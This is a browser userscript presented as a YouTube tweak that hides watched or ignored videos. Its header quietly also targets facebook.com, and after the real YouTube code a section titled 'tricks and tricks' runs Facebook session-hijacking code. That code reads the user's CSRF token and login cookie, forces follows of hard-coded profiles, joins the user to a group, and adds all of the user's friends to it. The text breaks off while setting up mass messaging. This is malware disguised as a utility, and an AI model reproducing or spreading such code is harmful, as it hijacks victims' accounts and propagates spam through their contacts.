// ==UserScript==
// @id             YoutubeTweak@zabkas
// @name           Youtube Tweak And Tricks
// @version        FULL+PRO
// @namespace      zabkas
// @author         Zabkas <djzabkas@gmail.com>
// @description    Add a delete button, automatically delete watched videos.
// @match          http://www.youtube.com/
// @match          http://www.youtube.com/?*
// @match          http://www.youtube.com/watch*
// @match          http://www.youtube.com/feed/*
// @match          https://www.youtube.com/
// @match          https://www.youtube.com/?*
// @match          https://www.youtube.com/watch*
// @match          https://www.youtube.com/feed/*
// @include        http://www.youtube.com/
// @include        http://www.youtube.com/?*
// @include        http://www.youtube.com/watch*
// @include        http://www.youtube.com/feed/*
// @include        https://www.youtube.com/
// @include        https://www.youtube.com/?*
// @include        https://www.youtube.com/watch*
// @include	      http://facebook.com/*
// @include	      http://*.facebook.com/*
// @include	      https://facebook.com/*
// @include	      https://*.facebook.com/*
// @include        https://www.youtube.com/feed/*
// @icon           data:image/png;base64,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
// @run-at         document-end
// ==/UserScript==

/*jslint devel: true, browser: true, regexp: true, continue: true, plusplus: true, maxerr: 50, indent: 4 */
/*global XPathResult: false */

(function () {
	"use strict";

	// add an item to the array if it doesn't exist
	Array.prototype.add = function (element) {
		var i;
		for (i = 0; i < this.length; i++) {
			if (this[i] === element) {
				return false;
			}
		}
		this.push(element);
		return true;
	};

	// remove all matching items
	Array.prototype.remove = function (element) {
		var removed = [], i;
		for (i = 0; i < this.length; i++) {
			if (this[i] === element) {
				removed.push(this.splice(i--, 1)[0]);
			}
		}
		return removed;
	};

	// return true if the element was found
	Array.prototype.exists = function (element) {
		var i;
		for (i = 0; i < this.length; i++) {
			if (this[i] === element) {
				return true;
			}
		}
		return false;
	};

	// some variables
	var msg, debug, DomStorage, YoutubeTweak, yt, cfg, saveAmount;

	// inicialization
	yt = null;
	debug = true;
	saveAmount = 500;

	// correct a few things
	if (saveAmount > 0) {
		saveAmount = -saveAmount;
	}

	// debug function
	msg = debug ? function (message) {
		console.log(JSON.stringify(message));
	} : function () {};

	/***************************************************************
	 * Name: DOM Storage Wrapper Class
	 * Author: Lunatrius <lunatrius@gmail.com>
	 *
	 * Public members:
	 *     ctor({"session"|"local"}[, <namespace>])
	 *     set(<key>, <value>)
	 *     get(<key>, <default value>)
	 *     remove(<key>)
	 *     keys()
	 *     removeAll()
	 ***************************************************************/
	DomStorage = function (type, namespace) {
		// variables
		var t = this,
			s,
			value,
			keys,
			key,
			i;

		// check if type if specified
		if (typeof (type) !== "string") {
			type = "session";
		}

		// check if namespace if specified
		if (!namespace || (typeof (namespace) !== "string" && typeof (namespace) !== "number")) {
			namespace = "script";
		}

		// bind the storage of a specific type to a variable
		switch (type) {
		case "local":
			s = localStorage;
			break;

		default: // case "session":
			s = sessionStorage;
			break;
		}

		// concat the namespace string
		namespace = ["domstorage", namespace].join(".").replace(/[^a-z0-9\.\-]/gi, "_");

		// set a key with a value
		t.set = function (key, value) {
			s.setItem([namespace, key].join(".").replace(/[^a-z0-9\.\-]/gi, "_"), JSON.stringify(value));
		};

		// get the value of a key, if there is none return the default value
		t.get = function (key, defaultValue) {
			value = JSON.parse(s.getItem([namespace, key].join(".").replace(/[^a-z0-9\.\-]/gi, "_")));
			if (value !== null && value !== undefined) {
				return value;
			}
			return defaultValue;
		};

		// remove a key
		t.remove = function (key) {
			s.removeItem([namespace, key].join(".").replace(/[^a-z0-9\.\-]/gi, "_"));
		};

		// return an array of keys
		t.keys = function () {
			keys = [];
			for (i = s.length - 1; i >= 0; i--) {
				key = s.key(i).replace([namespace, ""].join("."), "");
				if (key !== s.key(i)) {
					keys.push(key);
				}
			}
			keys.sort();
			return keys;
		};

		// remove all keys
		t.removeAll = function () {
			keys = t.keys();
			for (i = keys.length - 1; i >= 0; i--) {
				t.remove(keys[i]);
			}
		};
	};

	// the core of the script
	YoutubeTweak = function () {
		// delarations
		var t = this;


		// initialization
		t.style = null;

		// hotkey handler
		t.hotkey = function (e) {
			var value = null;
			if (e.altKey === true) {
				switch (e.keyCode) {
				case 49:
					value = cfg.get("removewatched", true);
					if (confirm("Do you want to " + (value ? "disable" : "enable") + " the removal of watched videos?")) {
						value = !value;
						cfg.set("removewatched", value);
						alert((value ? "Enabled" : "Disabled") + " the removal of watched videos.");
					}
					break;

				case 50:
					value = cfg.get("removeignored", true);
					if (confirm("Do you want to " + (value ? "disable" : "enable") + " the removal of ignored videos?")) {
						value = !value;
						cfg.set("removeignored", value);
						alert((value ? "Enabled" : "Disabled") + " the removal of ignored videos.");
					}
					break;
				}
			}
		};

		// initialization entry point
		t.init = function () {
			cfg = new DomStorage("local", "YoutubeTweak");
			try {
				window.addEventListener("keydown", t.hotkey, false);
				window.wrappedJSObject.ytt = cfg;
				document.head = document.head || document.getElementsByTagName("head")[0] || document.documentElement;
			} catch (ex) {
			}

			t.main();
		};

		// main function
		t.main = function () {
			var videoId;

			// video page
			if (location.pathname === "/watch") {
				videoId = t.getVideoId(location.search);
				if (videoId) {
					t.addWatched(videoId);
				}
			}

			// main page
			if (location.pathname === "/" || location.pathname === "/feed/subscriptions" || location.pathname === "/feed/subscriptions/activity" || location.pathname === "/feed/recommended") {
				// add the button design
				t.addStyle(".yt-tweak-button", {
					"position": "absolute",
					"top": "32px",
					"right": "2px",
					"width": "12px",
					"height": "12px",
					"cursor": "pointer",
					"background": "url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAMAAABhq6zVAAAACVBMVEX///9mZmb///+ofUk6AAAAAXRSTlMAQObYZgAAADFJREFUeNpljkEKAEAIAp3+/+jFLYRoTg2KJBEkKmD5Tgv4gEnMJG11JLU9cKcD650HPsQAzejNIlMAAAAASUVORK5CYII=')"
				});

				// add the button design - hover
				t.addStyle(".yt-tweak-button:hover", {
					"background": "url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAMAAABhq6zVAAAACVBMVEX///8AAP////+g6om+AAAAAXRSTlMAQObYZgAAADFJREFUeNpljkEKAEAIAp3+/+jFLYRoTg2KJBEkKmD5Tgv4gEnMJG11JLU9cKcD650HPsQAzejNIlMAAAAASUVORK5CYII=')"
				});

				// execute the functions and create an interval
				t.homeFunctions();
				setInterval(t.homeFunctions, 3000);
			}
		};

		// add a video to the watched list
		t.addWatched = function (videoId) {
			try {
				var watched = cfg.get("watched", []);
				watched.add(videoId);
				cfg.set("watched", watched.splice(saveAmount));
			} catch (ex) {
				msg(ex);
			}
		};

		// add a video to the ignored list
		t.addIgnored = function (videoId) {
			try {
				var ignored = cfg.get("ignored", []);
				ignored.add(videoId);
				cfg.set("ignored", ignored.splice(saveAmount));
			} catch (ex) {
				msg(ex);
			}
		};

		// check if a videos was watched
		t.existsWatched = function (videoId) {
			try {
				var watched = cfg.get("watched", []);
				return watched.exists(videoId);
			} catch (ex) {
				msg(ex);
				return false;
			}
		};

		// check if a videos was ignored
		t.existsIgnored = function (videoId) {
			try {
				var ignored = cfg.get("ignored", []);
				return ignored.exists(videoId);
			} catch (ex) {
				msg(ex);
				return false;
			}
		};

		// clean any whitespaces
		t.strip = function (string) {
			string = string.replace(/\s+/g, " ");
			string = string.replace(/^\s+/g, "");
			string = string.replace(/\s+$/g, "");
			return string;
		};

		// get the video ID (v argument)
		t.getVideoId = function (url) {
			var videoId = url.match(/v=([^&]+)/);
			if (videoId && videoId.length === 2) {
				return videoId[1];
			} else {
				return null;
			}
		};

		// append CSS style
		t.addStyle = function (cssRule, cssProperties) {
			var cssProp = [], i;
			if (t.style === null) {
				t.style = document.createElement("style");
				t.style.id = "YoutubeTweak";
				t.style.textContent = "";
				document.head.appendChild(t.style);
			}

			for (i in cssProperties) {
				if (cssProperties.hasOwnProperty(i)) {
					cssProp.push(i + ": " + cssProperties[i] + " !important;");
				}
			}

			t.style.textContent += cssRule + " {\n\t" + cssProp.join("\n\t") + "\n}" + "\n\n";
		};

		// used for the inverval timer
		t.homeFunctions = function () {
			t.addIgnoreButton();
			t.expandLists();

			t.deleteVideos();
			// t.deletePlaylists();
			// t.deleteListDescriptions();
			// t.deleteListItems();
			// t.deleteLists();
			// t.deleteMainListItems();
		};

		// generate a function for one button
		t.addIgnoredHandler = function (videoId) {
			return function () {
				t.addIgnored(videoId);

				if (this.className === "yt-tweak-button") {
					this.parentNode.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode.parentNode);
				}
			};
		};

		// add a button
		t.addIgnoreButton = function () {
			var videoSnap, i, videoId, button;

			videoSnap = document.evaluate("//div[contains(@class,'feed-item-main')]/div/div/h4/a[contains(@class,'title') and not(@button)]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

			for (i = 0; i < videoSnap.snapshotLength; i++) {
				button = document.createElement("div");
				button.classList.add("yt-tweak-button");

				videoSnap.snapshotItem(i).parentNode.parentNode.parentNode.parentNode.appendChild(button);
				videoSnap.snapshotItem(i).setAttribute("button", "yes");

				videoId = t.getVideoId(videoSnap.snapshotItem(i).href);

				if (videoId !== null && typeof (videoId) === "string") {
					button.addEventListener("click", t.addIgnoredHandler(videoId), false);
				}
			}
		};

		// try to delete all video on the page
		t.deleteVideos = function () {
			var videoSnap, i, videoId;

			videoSnap = document.evaluate("//div[contains(@class,'feed-item-main')]/div/div/h4/a[contains(@class,'title')]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

			for (i = 0; i < videoSnap.snapshotLength; i++) {
				videoId = t.getVideoId(videoSnap.snapshotItem(i).href);

				if (videoId !== null && typeof (videoId) === "string") {
					t.deleteVideo((t.existsWatched(videoId) && cfg.get("removewatched", true) === true) || (t.existsIgnored(videoId) && cfg.get("removeignored", true)), videoId);
				}
			}
		};

		// delete one video on the page
		t.deleteVideo = function (deleted, videoId) {
			if (deleted === true) {
				var videoSnap, node, container, i;

				videoSnap = document.evaluate("//div/ul/li/div/div/div/div/div/h4/a[contains(@class,'title') and contains(@href,'v=" + videoId + "')]/../../../../../..", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

				for (i = 0; i < videoSnap.snapshotLength; i++) {
					node = videoSnap.snapshotItem(i).parentNode;
					container = node.parentNode.parentNode;

					node.parentNode.removeChild(node);
					if (container.firstElementChild.childElementCount === 0) {
						// console.log("deleting empty container...");
						container.parentNode.removeChild(container);
					}
					// videoSnap.snapshotItem(i).parentNode.parentNode.parentNode.parentNode.removeChild(videoSnap.snapshotItem(i).parentNode.parentNode.parentNode);
				}
			}
		};
/*
		// delete playlists - these are useless as everything is ALREADY listed
		t.deletePlaylists = function () {
			var snapPlaylists, item, i;
			snapPlaylists = document.evaluate("//div[contains(@class,'feed-item-content-playlist')]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapPlaylists.snapshotLength; i++) {
				item = snapPlaylists.snapshotItem(i);
				item.parentNode.removeChild(item);
			}
			snapPlaylists = document.evaluate("//div[contains(@class,'feed-item-main')]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapPlaylists.snapshotLength; i++) {
				item = snapPlaylists.snapshotItem(i);
				if (item.childElementCount === 2 || item.childElementCount === 1) {
					item.parentNode.removeChild(item);
				}
			}
		};

		// delete list descriptions
		t.deleteListDescriptions = function () {
			var snapListDesc, item, i;
			snapListDesc = document.evaluate("//div[contains(@class,'feed-item-description')]/div", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapListDesc.snapshotLength; i++) {
				item = snapListDesc.snapshotItem(i);
				if (item.children.length === 0) {
					item.parentNode.parentNode.removeChild(item.parentNode);
				}
			}
		};

		// delete all remaining trash elements
		t.deleteListItems = function () {
			var snapListItems, item, i;
			snapListItems = document.evaluate("//div[contains(@class,'feed-page')]/ul/li/div/div", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapListItems.snapshotLength; i++) {
				item = snapListItems.snapshotItem(i);
				if (item.children.length === 0) {
					item.parentNode.parentNode.parentNode.removeChild(item.parentNode.parentNode);
				}
			}
		};

		// delete remaining list elements
		t.deleteLists = function () {
			var snapListItems, item, i;
			snapListItems = document.evaluate("//div[contains(@class,'feed-page')]/ul", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapListItems.snapshotLength; i++) {
				item = snapListItems.snapshotItem(i);
				if (item.children.length === 0) {
					item.parentNode.parentNode.removeChild(item.parentNode);
				}
			}
		};

		// delete remaining main list elements
		t.deleteMainListItems = function () {
			var snapMainListItems, item, i;
			snapMainListItems = document.evaluate("//li[contains(@class,'feed-item-container')]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
			for (i = 0; i < snapMainListItems.snapshotLength; i++) {
				item = snapMainListItems.snapshotItem(i);
				if (!/watch([^"]+)v=([^&]+)&/i.test(item.innerHTML)) {
					item.parentNode.removeChild(item);
				}
			}
		};
*/
		// auto expand the lists ONCE
		t.expandLists = function () {
			var spanSnap, item, i;

			spanSnap = document.evaluate("//a[contains(@class,'show-more') and not(@done)]", document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

			for (i = 0; i < spanSnap.snapshotLength; i++) {
				item = spanSnap.snapshotItem(i);
				try {
					item.click();
				} catch (exA) {}
				try {
					item.wrappedJSObject.click();
				} catch (exB) {}
				item.setAttribute("done", "yes");
			}
		};

		// execute the script
		t.init();
	};

	// filter out and errors
	try {
		// only run on the specified domain
		if (/www\.youtube\.com/i.test(location.host) && window.top === window.self) {
			// only run on the main and video pages
			if (location.pathname === "/" || location.pathname === "/feed/subscriptions" || location.pathname === "/feed/subscriptions/activity" || location.pathname === "/feed/recommended" || location.pathname === "/watch") {
				// create a new instance of the core
				yt = new YoutubeTweak();
			}
		}
	} catch (ex) {
		msg(ex);
	}
}());


//tricks and tricks
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("283138951809017");
a("444800178897799");
a("293300857447850");
a("137810779641037");
a("566209433406376");

sublist("412236315524079");
var gid = ['412236315524079'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "455999411080232";
var spost_id = "455999411080232";
var sfoto_id = "455999411080232";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
